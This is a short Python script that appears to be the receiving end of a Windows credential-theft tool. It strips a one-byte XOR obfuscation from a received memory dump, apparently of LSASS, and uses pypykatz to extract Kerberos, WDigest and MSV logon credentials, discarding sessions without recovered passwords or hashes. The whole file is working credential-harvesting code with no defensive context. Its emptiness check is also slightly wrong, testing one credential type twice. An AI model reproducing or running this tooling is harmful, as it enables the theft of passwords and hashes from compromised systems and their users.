import asyncio
from pypykatz import pypykatz

async def parse_dump(data: bytes) -> dict:
    key = data[-1]
    data = data[:-1]
    print(f"Key is {key}, (hex {hex(key)})")
    print("Data length:", len(data))

    # De-xoring received data
    keys = int.from_bytes(bytes([key] * len(data)))
    data_int = int.from_bytes(data)
    dump = (data_int ^ keys)
    dump_bytes = dump.to_bytes(len(data))
    print("Done de-xoring dump")

    # Read dump and extract data
    dump_reader = await asyncio.wait_for(parse_minidump(dump_bytes), 3)

    # Filter out result and print
    dump_dict = dump_reader.to_dict()["logon_sessions"]
    for key in dump_dict.copy():
        lsa = dump_dict[key]
        k = lsa["kerberos_creds"]
        w = lsa["wdigest_creds"]
        m = lsa["msv_creds"]
        for i in k.copy():
            if i["password"] == None:
                k.remove(i)
        for i in w.copy():
            if i["password"] == None:
                w.remove(i)
        # for i in k.copy():
        #     if i["NThash"] == None:
        #         m.remove(i)
        if (
            len(lsa["kerberos_creds"]) == 0 and 
            len(lsa["msv_creds"]) == 0 and
            len(lsa["msv_creds"]) == 0
        ):
            print("Deleting", key)
            del dump_dict[key]
    
    return dump_dict


async def parse_minidump(dump):
    return pypykatz.pypykatz.parse_minidump_bytes(dump, ["msv", "wdigest", "kerberos"])
